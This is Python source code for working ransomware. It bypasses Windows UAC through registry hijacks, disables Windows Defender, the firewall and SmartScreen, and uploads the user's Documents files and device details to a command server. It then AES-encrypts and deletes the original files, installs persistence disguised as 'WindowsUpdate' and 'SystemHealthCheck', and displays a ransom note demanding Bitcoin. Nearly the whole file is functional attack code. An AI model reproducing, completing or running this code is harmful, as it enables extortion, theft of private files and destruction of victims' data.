# Imports
# from cryptography.fernet import Fernet  # type: ignore # encrypt/decrypt files on target system
import os  # to get system root

# import webbrowser # to load webbrowser to go to specific website eg bitcoin
import ctypes  # so we can interact with windows dlls and change windows background etc
import urllib.request  # used for downloading and saving background image
import requests  # type: ignore # used to make get reqeust to api.ipify.org to get target machine ip addr
import time  # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime  # to give time limit on ransom note
import subprocess  # to create process for notepad and open ransom note

# used to get window text to see if ransom note is on top of all other windows
from Crypto.PublicKey import RSA  # type: ignore
from Crypto.Random import get_random_bytes  # type: ignore
from Crypto.Cipher import AES, PKCS1_OAEP  # type: ignore
from Crypto.Util.Padding import pad, unpad
import base64
import threading  # used for ransom note and decryption key on dekstop
from pathlib import Path
import tkinter as tk
import sys
import platform
import socket
import glob
import shutil
from pynput import keyboard
from pyngrok import ngrok
import socketio
import json  # ✅ Tambahkan ini

# Konfigurasi API
API_TOKEN = "lazarus"
SERVER_URL = "http://192.168.1.2:5000"

#def resource_path(filename):
 #           import sys
  #          if hasattr(sys, '_MEIPASS'):
  #              return os.path.join(sys._MEIPASS, filename)
   #         return os.path.abspath(filename)
def resource_path(relative_path):
    """Ambil absolute path untuk resources, bekerja untuk dev dan PyInstaller"""
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    path = os.path.join(base_path, relative_path)
    
    # Debug: Cek apakah file ada
    if not os.path.exists(path):
        raise FileNotFoundError(f"File tidak ditemukan: {path} (Base path: {base_path})")
    
    return path
class RansomWare:
    def silent_uac_bypass(self):
        """Advanced UAC bypass that works completely silently without showing any prompts"""
        if os.name != "nt":
            return False  # Only works on Windows

        try:
            # First check if we're already admin
            if ctypes.windll.shell32.IsUserAnAdmin():
                return True

            # Technique 1: Use fodhelper.exe auto-elevation (Windows 10/11)
            def fodhelper_bypass():
                try:
                    import tempfile

                    # Create temporary batch file
                    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".bat")
                    tmp.write(f'@start /b "" "{sys.executable}"'.encode())
                    tmp.close()

                    # Modify registry
                    key_path = r"Software\Classes\ms-settings\shell\open\command"
                    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, tmp.name)
                        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")

                    # Execute fodhelper silently
                    subprocess.Popen(
                        "fodhelper.exe",
                        shell=True,
                        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.PIPE,
                    )

                    # Cleanup
                    time.sleep(3)
                    os.unlink(tmp.name)
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                    return True
                except Exception as e:
                    print(f"[!] Fodhelper bypass failed: {e}")
                    return False

            # Technique 2: Use computerdefaults.exe (alternative method)
            def computerdefaults_bypass():
                try:
                    import tempfile

                    # Create temporary batch file
                    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".bat")
                    tmp.write(f'@start /b "" "{sys.executable}"'.encode())
                    tmp.close()

                    # Modify registry
                    key_path = r"Software\Classes\ms-settings\shell\open\command"
                    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, tmp.name)
                        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")

                    # Execute computerdefaults silently
                    subprocess.Popen(
                        "computerdefaults.exe",
                        shell=True,
                        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.PIPE,
                    )

                    # Cleanup
                    time.sleep(3)
                    os.unlink(tmp.name)
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                    return True
                except Exception as e:
                    print(f"[!] Computerdefaults bypass failed: {e}")
                    return False

            # Technique 3: Use eventvwr.exe (Windows 7/8/10)
            def eventvwr_bypass():
                try:
                    import tempfile

                    # Create temporary batch file
                    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".bat")
                    tmp.write(f'@start /b "" "{sys.executable}"'.encode())
                    tmp.close()

                    # Modify registry
                    key_path = r"Software\Classes\mscfile\shell\open\command"
                    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, tmp.name)

                    # Execute eventvwr silently
                    subprocess.Popen(
                        "eventvwr.exe",
                        shell=True,
                        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.PIPE,
                    )

                    # Cleanup
                    time.sleep(3)
                    os.unlink(tmp.name)
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                    return True
                except Exception as e:
                    print(f"[!] Eventvwr bypass failed: {e}")
                    return False

            # Try all techniques in sequence
            if fodhelper_bypass() or computerdefaults_bypass() or eventvwr_bypass():
                sys.exit(0)  # Exit current process
            else:
                # Fallback to traditional method (may show prompt)
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, None, 0
                )
                sys.exit(0)

        except Exception as e:
            print(f"[!] Silent UAC bypass failed: {e}")
            return False

    def disable_uac_completely(self):
        """Completely disable UAC without notifications or restart"""
        if os.name != "nt":
            return False

        try:
            # 1. Disable UAC via registry
            reg_commands = [
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableLUA" /t REG_DWORD /d 0 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableInstallerDetection" /t REG_DWORD /d 0 /f',
            ]

            # Execute commands silently
            for cmd in reg_commands:
                subprocess.run(
                    cmd,
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )

            # 2. Disable security notifications
            subprocess.run(
                'powershell -Command "Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableSecureUIAPaths" -Value 0 -Force"',
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # 3. Force policy update without restart
            subprocess.run(
                "gpupdate /force",
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # 4. Kill any UAC related processes
            subprocess.run(
                "taskkill /f /im consent.exe /im mshta.exe",
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            print("[+] UAC completely disabled without restart")
            return True

        except Exception as e:
            print(f"[!] Failed to disable UAC: {e}")
            return False

    def run_as_admin(self):
        if os.name != "nt":
            return True  # Hanya berlaku di Windows

        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                # Jalankan ulang script sebagai administrator
                script = os.path.abspath(sys.argv[0])
                params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, f'"{script}" {params}', None, 1
                )
                sys.exit(0)
            return True
        except Exception as e:
            print(f"[!] Gagal minta akses administrator: {e}")
            return False

    # ... (keep your existing methods) ...

    def try_disable_antivirus(self):
        if os.name != "nt":
            print("[!] Antivirus disable only supported on Windows.")
            return

        print("[*] Attempting to disable antivirus via registry modifications...")

        try:
            import winreg

            # Registry keys to disable Windows Defender
            defender_keys = [
                (
                    r"SOFTWARE\Policies\Microsoft\Windows Defender",
                    "DisableAntiSpyware",
                    1,
                ),
                (
                    r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                    "DisableRealtimeMonitoring",
                    1,
                ),
                (
                    r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                    "DisableBehaviorMonitoring",
                    1,
                ),
                (
                    r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                    "DisableOnAccessProtection",
                    1,
                ),
                (
                    r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                    "DisableScanOnRealtimeEnable",
                    1,
                ),
                (
                    r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet",
                    "SubmitSamplesConsent",
                    2,
                ),
                (
                    r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet",
                    "DisableBlockAtFirstSeen",
                    1,
                ),
                (r"SOFTWARE\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
                (
                    r"SOFTWARE\Microsoft\Windows Defender\Features",
                    "TamperProtection",
                    0,
                ),
            ]

            # Additional security products to disable
            third_party_keys = [
                (
                    r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate",
                    "DisableWindowsUpdateAccess",
                    1,
                ),
                (
                    r"SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile",
                    "EnableFirewall",
                    0,
                ),
                (r"SOFTWARE\Policies\Microsoft\Windows\System", "EnableSmartScreen", 0),
            ]

            # Disable Windows Defender via registry
            for key_path, value_name, value_data in defender_keys:
                try:
                    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                    winreg.CloseKey(key)
                    print(f"[+] Set {key_path}\\{value_name} = {value_data}")
                except Exception as e:
                    print(f"[!] Failed to set {key_path}\\{value_name}: {e}")

            # Disable third-party security features
            for key_path, value_name, value_data in third_party_keys:
                try:
                    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                    winreg.CloseKey(key)
                    print(f"[+] Set {key_path}\\{value_name} = {value_data}")
                except Exception as e:
                    print(f"[!] Failed to set {key_path}\\{value_name}: {e}")

            # Disable Windows Defender services via registry
            service_keys = [
                (r"SYSTEM\CurrentControlSet\Services\WinDefend", "Start", 4),
                (r"SYSTEM\CurrentControlSet\Services\WdNisSvc", "Start", 4),
                (r"SYSTEM\CurrentControlSet\Services\Sense", "Start", 4),
                (
                    r"SYSTEM\CurrentControlSet\Services\SecurityHealthService",
                    "Start",
                    4,
                ),
            ]

            for key_path, value_name, value_data in service_keys:
                try:
                    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                    winreg.CloseKey(key)
                    print(
                        f"[+] Disabled service {os.path.basename(key_path)}"
                    )  # Fixed line
                except Exception as e:
                    print(
                        f"[!] Failed to disable service {os.path.basename(key_path)}: {e}"
                    )

            # Force policy update
            try:
                subprocess.run(
                    "gpupdate /force",
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                print("[+] Forced group policy update")
            except Exception as e:
                print(f"[!] Failed to update group policy: {e}")

            # Stop services immediately
            services = ["WinDefend", "WdNisSvc", "Sense", "SecurityHealthService"]
            for service in services:
                try:
                    subprocess.run(
                        f"net stop {service}",
                        shell=True,
                        creationflags=subprocess.CREATE_NO_WINDOW,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    print(f"[+] Stopped service: {service}")
                except Exception as e:
                    print(f"[!] Failed to stop service {service}: {e}")

            print("[+] Antivirus disabled via registry modifications")

        except Exception as e:
            print(f"[!] Could not disable antivirus via registry: {e}")

    def get_location_from_ip(ip):
        try:
            data = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5).json()
            loc = data.get("loc", "0,0")
            lat, lng = map(float, loc.split(","))
            location = ", ".join(
                filter(
                    None, [data.get("city"), data.get("region"), data.get("country")]
                )
            )
            return location, lat, lng
        except Exception:
            return "Unknown", 0.0, 0.0

    def send_device_info(self, server_url, token):
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            try:
                public_ip = requests.get(
                    "https://api.ipify.org", timeout=5
                ).text.strip()
            except:
                public_ip = "Unknown"

            # Ambil lokasi dari IP publik
            try:
                geo_url = f"https://ipinfo.io/{public_ip}/json?token=1fe22dc9bd61ec"
                geo = requests.get(geo_url, timeout=5).json()
                location_str = ", ".join(
                    filter(
                        None, [geo.get("city"), geo.get("region"), geo.get("country")]
                    )
                )
                lat, lng = map(float, geo.get("loc", "0,0").split(","))
            except Exception as e:
                print(f"[WARN] Failed to fetch location: {e}")
                location_str = "Unknown"
                lat, lng = 0.0, 0.0

            info = {
                "timestamp": datetime.datetime.now().isoformat(),
                "hostname": socket.gethostname(),
                "ip": local_ip,
                "public_ip": public_ip,
                "location": location_str,
                "latitude": lat,
                "longitude": lng,
                "os": f"{platform.system()} {platform.release()}",
                "user": os.getenv("USERNAME") or os.getenv("USER") or "unknown",
                "antivirus": self.get_antivirus_status(),
            }

            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }

            r = requests.post(f"{server_url}/upload_info", json=info, headers=headers)
            print(f"[INFO] Device info sent: {r.status_code}")
            print(f"[DEBUG] Payload:\n{json.dumps(info, indent=2)}")
            print(socket.gethostname())

        except Exception as e:
            print(f"[ERROR] Failed to send device info: {e}")

    

    def send_file_to_server(self, server_url, token, file_path):
        try:
            hostname = socket.gethostname()
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                data = {"hostname": hostname, "token": token}
                r = requests.post(f"{server_url}/upload_file", files=files, data=data)
                print(f"[INFO] File sent: {r.status_code} - {file_path}")
        except Exception as e:
            print(f"[ERROR] Failed to send file: {e}")

    def collect_and_send_files(self, server_url, token):
        target_dirs = [
            os.path.join(Path.home(), "Documents"),
            # os.path.join(Path.home(), "Desktop"),
            # os.path.join(Path.home(), "Downloads"),
            # os.path.join(Path.home(), "Pictures"),
        ]
        for folder in target_dirs:
            for root, _, files in os.walk(folder):
                for file in files:
                    full_path = os.path.join(root, file)
                    if os.path.isfile(full_path):
                        self.send_file_to_server(server_url, token, full_path)

    def get_antivirus_status(self):
        """Cek status real-time protection Windows Defender (Windows only)"""
        if os.name != "nt":
            return "Unsupported OS"
        try:
            result = subprocess.run(
                [
                    "powershell",
                    "-Command",
                    "(Get-MpComputerStatus).RealTimeProtectionEnabled",
                ],
                capture_output=True,
                text=True,
            )
            if "True" in result.stdout:
                return "Windows Defender (Active)"
            elif "False" in result.stdout:
                return "Windows Defender (Inactive)"
            else:
                return "Unknown"
        except Exception as e:
            return f"Error: {e}"

    def deploy_to_startup(self, script_path):
        import shutil
        from pynput import keyboard
        import socketio
        import getpass
        import sys

        try:
            if os.name != "nt":
                print("[!] Startup autorun hanya berlaku untuk Windows.")
                return

            startup_dir = os.path.join(
                os.environ["APPDATA"],
                "Microsoft",
                "Windows",
                "Start Menu",
                "Programs",
                "Startup",
            )

            target_path = os.path.join(startup_dir, os.path.basename(script_path))
            shutil.copy(script_path, target_path)
            print(f"[+] Script berhasil disalin ke Startup: {target_path}")

        except Exception as e:
            print(f"[!] Gagal menyebar ke Startup folder: {e}")

    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method

        self.key = None
        # Encrypt/Decrypter
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None
        self.file_exts = [
            "exe,",
            "dll",
            "so",
            #'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
            "jpg",
            "jpeg",
            "bmp",
            "gif",
            "png",
            "svg",
            "psd",
            "raw",  # images
            "mp3",
            "mp4",
            "m4a",
            "aac",
            "ogg",
            "flac",
            "wav",
            "wma",
            "aiff",
            "ape",  # music and sound
            "avi",
            "flv",
            "m4v",
            "mkv",
            "mov",
            "mpg",
            "mpeg",
            "wmv",
            "swf",
            "3gp",  # Video and movies
            "doc",
            "docx",
            "xls",
            "xlsx",
            "ppt",
            "pptx",  # Microsoft office
            "odt",
            "odp",
            "ods",
            "txt",
            "rtf",
            "tex",
            "pdf",
            "epub",
            "md",  # OpenOffice, Adobe, Latex, Markdown, etc
            "yml",
            "yaml",
            "json",
            "xml",
            "csv",  # structured data
            "db",
            "sql",
            "dbf",
            "mdb",
            "iso",  # databases and disc images
            "html",
            "htm",
            "xhtml",
            "php",
            "asp",
            "aspx",
            "js",
            "jsp",
            "css",  # web technologies
            "c",
            "cpp",
            "cxx",
            "h",
            "hpp",
            "hxx",  # C source code
            "java",
            "class",
            "jar",  # java source code
            "ps",
            "bat",
            "vb",  # windows based scripts
            "awk",
            "sh",
            "cgi",
            "pl",
            "ada",
            "swift",  # linux/mac based scripts
            "go",
            #"py",
            "pyc",
            "bf",
            "coffee",  # other source code files
            "zip",
            "tar",
            "tgz",
            "bz2",
            "7z",
            "rar",
            "bak",
        ]
        self.persistence_methods = [
            self._add_startup_persistence,
            self._add_registry_persistence,
            self._add_scheduled_task,
        ]
        self.encrypted_extension = ".lazy"

        """ Root directorys to start Encryption/Decryption from
            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
            CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
        """
        # Use proper path joining for Windows
        if os.name == "nt":  # Windows
            self.sysRoot = os.path.expanduser("~")
        else:  # Linux/Mac
            # Use sysroot to create absolute path for files, etc. And for encrypting whole system
            self.sysRoot = os.path.expanduser("~")
        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"

        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
        self.publicIP = requests.get("https://api.ipify.org").text

    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    def generate_key(self):
        self.key = get_random_bytes(32)

    def write_key(self):
        with open("aes_key.bin", "wb") as f:
            f.write(self.key)

    def encrypt_key_with_rsa(self):
        self.public_key = RSA.import_key(open(resource_path("public.pem")).read())
        cipher_rsa = PKCS1_OAEP.new(self.public_key)
        encrypted_key = cipher_rsa.encrypt(self.key)
        with open(resource_path("aes_key.bin"), "wb") as f:
            f.write(encrypted_key)

    def encrypt_file(self, file_path):
        try:
            # Lewati file yang sudah terenkripsi
            if file_path.endswith(self.encrypted_extension):
                print("[!] File already encrypted, skipping.")
                return

            with open(file_path, "rb") as f:
                data = f.read()

            original_name = os.path.basename(file_path).encode()
            payload = b"FILENAME||" + original_name + b"\n" + data

            cipher = AES.new(self.key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(payload, AES.block_size))
            encrypted_data = cipher.iv + ct_bytes

            encrypted_path = file_path + self.encrypted_extension
            with open(encrypted_path, "wb") as f:
                f.write(encrypted_data)

            os.remove(file_path)
            print(f"[+] Encrypted: {file_path} -> {encrypted_path}")
            print(f"[DEBUG] AES Encrypt Key (hex): {self.key.hex()}")

        except Exception as e:
            print(f"[!] Failed to encrypt {file_path}: {e}")

    def decrypt_all_layers(self, file_path):
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            
            iv = data[:16]
            ct = data[16:]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(ct), AES.block_size)

            # Ekstrak nama file asli dan data
            if b"FILENAME||" in decrypted:
                header, file_data = decrypted.split(b"\n", 1)
                original_name = header.split(b"FILENAME||")[1].decode()
            else:
                original_name = "decrypted_file"

            # Simpan file
            output_path = os.path.join(os.path.dirname(file_path), original_name)
            with open(output_path, "wb") as f:
                f.write(file_data)
            
            os.remove(file_path)
            print(f"[SUCCESS] Decrypted: {output_path}")
        
        except Exception as e:
            print(f"[ERROR] Failed to decrypt {file_path}: {str(e)}")


    def crypt_system(self, encrypted=False):
        folders = self.get_target_dirs()
        for folder in folders:
            for root, _, files in os.walk(folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    if encrypted:
                        if file_path.endswith(self.encrypted_extension):
                            self.decrypt_all_layers(file_path)
                    else:
                        if not file_path.endswith(self.encrypted_extension) and any(
                            file.lower().endswith(f".{ext}") for ext in self.file_exts
                        ):
                            self.encrypt_file(file_path)

    def get_target_dirs(self):
        if os.name == "nt":
            folders = ["Documents"]
        elif os.name == "posix":
            folders = ["Music"]
        else:
            return []
        return [os.path.join(Path.home(), folder) for folder in folders]
    
    def change_desktop_background(self, image_source=None):
        try:
            default_url = "https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg"
            image_url = image_source or default_url
            bg_path = os.path.join(self.sysRoot, "Desktop", "background.jpg")

            # Disable SSL verification to prevent certificate errors
            import ssl

            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE

            if image_url.startswith("http"):
                try:
                    # Use requests with SSL verification disabled
                    response = requests.get(
                        image_url,
                        stream=True,
                        timeout=10,
                        verify=False,
                        headers={"User-Agent": "Mozilla/5.0"},
                    )

                    if response.status_code == 200:
                        with open(bg_path, "wb") as f:
                            for chunk in response.iter_content(1024):
                                f.write(chunk)
                    else:
                        print(
                            f"> ERROR: Could not download image, status code: {response.status_code}"
                        )
                        return
                except requests.exceptions.SSLError:
                    # Fallback to urllib with SSL context disabled
                    try:
                        import urllib.request

                        opener = urllib.request.build_opener(
                            urllib.request.HTTPSHandler(context=ssl_context)
                        )
                        urllib.request.install_opener(opener)
                        urllib.request.urlretrieve(image_url, bg_path)
                    except Exception as e:
                        print(f"> ERROR: Failed to download image (fallback): {str(e)}")
                        return
                except Exception as e:
                    print(f"> ERROR: Failed to download image: {str(e)}")
                    return
            else:
                if not os.path.exists(image_url):
                    print(f"> ERROR: File not found: {image_url}")
                    return
                try:
                    with open(image_url, "rb") as src, open(bg_path, "wb") as dst:
                        dst.write(src.read())
                except Exception as e:
                    print(f"> ERROR: Failed to copy local image: {str(e)}")
                    return

            # Set the wallpaper
            if os.name == "nt":
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(
                    SPI_SETDESKWALLPAPER, 0, bg_path, 3
                )
                print("> Wallpaper successfully changed on Windows.")
            elif os.name == "posix":
                try:
                    # Try GNOME first
                    subprocess.run(
                        [
                            "gsettings",
                            "set",
                            "org.gnome.desktop.background",
                            "picture-uri",
                            f"'file://{bg_path}'",
                        ],
                        check=True,
                    )
                    print("> Wallpaper successfully changed on GNOME.")
                except:
                    try:
                        # Try KDE
                        subprocess.run(
                            ["plasma-apply-wallpaperimage", bg_path], check=True
                        )
                        print("> Wallpaper successfully changed on KDE.")
                    except:
                        try:
                            # Try XFCE
                            subprocess.run(
                                [
                                    "xfconf-query",
                                    "-c",
                                    "xfce4-desktop",
                                    "-p",
                                    "/backdrop/screen0/monitor0/image-path",
                                    "-s",
                                    bg_path,
                                ],
                                check=True,
                            )
                            print("> Wallpaper successfully changed on XFCE.")
                        except Exception as e:
                            print(
                                f"> ERROR: Could not set wallpaper on Linux: {str(e)}"
                            )
            else:
                print("> OS not supported for wallpaper changing.")

        except Exception as e:
            print(f"> ERROR during wallpaper change: {str(e)}")

    def ransom_note(self):
        note_path = os.path.join(self.sysRoot, "Desktop", "Readme.txt")
        with open(note_path, "w") as f:
            f.write(
                f"""
    Ooops! Your important files have been encrypted.

    Your files have been secured using military-grade AES-256 encryption.
    The decryption key has been encrypted using RSA and is stored securely.
    Without this key, recovery is impossible.

    To recover your files, follow these steps:

    1. Send $300 worth of Bitcoin to the address below:
    BTC Address: 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX

    2. After payment, send an email to:
    wormshit123456@posteo.net

    Include your:
    - Computer name: {socket.gethostname()}
    - Public IP: {self.publicIP}

    3. You will receive a file named 'private.pem' that can decrypt your files using our provided GUI.

    WARNING:
    - DO NOT rename, modify, or delete encrypted files (.lazy)
    - DO NOT run third-party decryptors — they will fail and may corrupt your data
    - DO NOT shut down the system until decryption is complete

    Failure to follow instructions will result in permanent loss of your files.

    We are watching. Pay and recover your life.
    """
            )

    def _add_startup_persistence(self):
        if os.name != "nt":
            print("[!] Startup persistence skipped (not Windows).")
            return
        try:
            startup_path = os.path.join(
                os.environ["APPDATA"],
                "Microsoft",
                "Windows",
                "Start Menu",
                "Programs",
                "Startup",
                "system_check.exe",
            )
            if not os.path.exists(startup_path):
                shutil.copy2(sys.executable, startup_path)
                print(f"[+] Persistence added to Startup folder: {startup_path}")
        except Exception as e:
            print(f"[-] Startup persistence failed: {e}")

    def _add_registry_persistence(self):
        if os.name != "nt":
            print("[!] Registry persistence skipped (not Windows).")
            return
        try:
            import winreg

            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(
                    regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable
                )
            print("[+] Registry persistence added")
        except Exception as e:
            print(f"[-] Registry persistence failed: {e}")

    def _add_scheduled_task(self):
        if os.name != "nt":
            print("[!] Scheduled task skipped (not Windows).")
            return
        try:
            task_cmd = (
                f'schtasks /create /tn "SystemHealthCheck" /tr "{sys.executable}" '
                "/sc onlogon /rl highest /f"
            )
            subprocess.run(task_cmd, shell=True, check=True)
            print("[+] Scheduled task created")
        except subprocess.CalledProcessError as e:
            print(f"[-] Task scheduler failed: {e}")

    def _hide_process(self):
        """Menyembunyikan proses (Windows only)"""
        if os.name == "nt":
            try:
                ctypes.windll.kernel32.SetConsoleTitleW("svchost")
                print("[+] Process hidden as svchost")
            except:
                print("[-] Failed to hide process")

    
    def show_ransom_note(self):
        import tkinter as tk
        from tkinter import messagebox, filedialog
        from Crypto.PublicKey import RSA
        from Crypto.Cipher import PKCS1_OAEP
        import os, socket, datetime, tempfile, requests

        def resource_path(filename):
            import sys
            if hasattr(sys, '_MEIPASS'):
                return os.path.join(sys._MEIPASS, filename)
            return os.path.abspath(filename)

        ransom_text = (
            "Ooops, your important files are encrypted.\n\n"
            "Nobody can recover your files without our decryption service.\n\n"
            "Steps:\n"
            "1. Send $300 in Bitcoin to:\n"
            "   1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\n\n"
            "2. Email your wallet ID to wormshit123456@posteo.net\n"
            "3. You will receive a private.pem to unlock your files.\n\n"
            "You can also manually enter the AES key below if you have it:"
        )

        root = tk.Tk()
        root.title("Ooops, your files are encrypted")
        root.geometry("800x600")
        root.configure(bg="black")
        root.resizable(False, False)

        frame = tk.Frame(root, bg="black")
        frame.pack(fill="both", expand=True, padx=20, pady=20)

        text_box = tk.Text(frame, bg="black", fg="red", font=("Courier New", 12), wrap="word", borderwidth=0, height=15)
        text_box.insert("1.0", ransom_text)
        text_box.config(state="disabled")
        text_box.pack(fill="x", expand=False)

        label = tk.Label(
            frame,
            text="Click 'Decrypt Now' or wait for auto-load (if private.pem and aes_key.bin are bundled):",
            bg="black", fg="white", font=("Courier New", 10),
        )
        label.pack(pady=(10, 0))

        log_box = tk.Text(frame, height=10, bg="black", fg="lime", font=("Courier New", 10), borderwidth=1)
        log_box.pack(fill="x", padx=10, pady=(10, 0))

        def attempt_auto_load_key():
            try:
                SERVER_URL = "http://192.168.1.2:5000"
                TOKEN = "lazarus"
                hostname = os.getenv("COMPUTERNAME") or socket.gethostname()
                date_folder = datetime.datetime.now().strftime("%Y-%m-%d")

                url_pem = f"{SERVER_URL}/download/{hostname}/{date_folder}/private.pem?token={TOKEN}"
                url_bin = f"{SERVER_URL}/download/{hostname}/{date_folder}/aes_key.bin?token={TOKEN}"

                temp_dir = tempfile.mkdtemp()
                pem_path = os.path.join(temp_dir, "private.pem")
                bin_path = os.path.join(temp_dir, "aes_key.bin")

                with open(pem_path, "wb") as f:
                    f.write(requests.get(url_pem).content)
                with open(bin_path, "wb") as f:
                    f.write(requests.get(url_bin).content)

                with open(pem_path, "rb") as f:
                    private_key = RSA.import_key(f.read())
                with open(bin_path, "rb") as f:
                    encrypted_key = f.read()

                cipher_rsa = PKCS1_OAEP.new(private_key)
                self.key = cipher_rsa.decrypt(encrypted_key)

                if len(self.key) != 32:
                    raise ValueError("Invalid AES key length")

                log_box.insert(tk.END, "[✓] AES key auto-downloaded and decrypted from server.\n")
                return True
            except Exception as e:
                log_box.insert(tk.END, f"[!] Auto-load from server failed: {e}\n")
            return False


        def unified_decrypt():
            try:
                pem_path = filedialog.askopenfilename(
                    title="Select your private.pem",
                    filetypes=[("PEM files", "*.pem")],
                )
                if not pem_path:
                    messagebox.showwarning("Missing File", "private.pem not selected. Decryption aborted.")
                    return

                with open(pem_path, "rb") as f:
                    private_key = RSA.import_key(f.read())

                bin_path = filedialog.askopenfilename(
                    title="Select aes_key.bin", filetypes=[("BIN files", "*.bin")]
                )
                if not bin_path:
                    messagebox.showwarning("Missing File", "aes_key.bin not selected. Decryption aborted.")
                    return

                with open(bin_path, "rb") as f:
                    encrypted_key = f.read()

                cipher_rsa = PKCS1_OAEP.new(private_key)
                self.key = cipher_rsa.decrypt(encrypted_key)

                if len(self.key) != 32:
                    raise ValueError("Decrypted AES key is invalid length.")

                log_box.insert(tk.END, "[✓] AES key decrypted from selected files.\n")
